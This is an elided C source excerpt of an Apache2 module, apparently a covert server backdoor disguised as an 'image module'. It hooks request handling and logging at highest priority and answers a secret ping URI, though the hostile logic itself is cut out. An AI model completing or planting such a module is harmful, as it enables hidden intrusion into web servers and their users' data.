/* ------------------------------------*/
/* Apache2 image module (@RicoVlad) */
/* ------------------------------------*/

/* Idea inspired from @TheXC3LL */
// https://www.tarlogic.com/en/blog/images-modulos-apache/
/* ************************************************************* */
...
static int image_post_read_request(request_rec *r) {
	int fd, sock, n, sr;
	fd_set readset;
	...
	if (!strcmp(r->uri, PINGWORD)) {
		write(fd, "[+] image module is running !\n", strlen("[+] image module is running !\n"));
		close(fd);
		exit(0);
	}
...
int image_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
...
static int image_log_transaction(request_rec *r) {
	const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;
...
static void image_register_hooks(apr_pool_t *p){
	ap_hook_post_read_request((void *) image_post_read_request, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_post_config((void *) image_post_config, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_log_transaction(image_log_transaction, NULL, NULL, APR_HOOK_FIRST);
}
...
module AP_MODULE_DECLARE_DATA image_module = {
    ...
    image_register_hooks	/* register hooks                      */
};
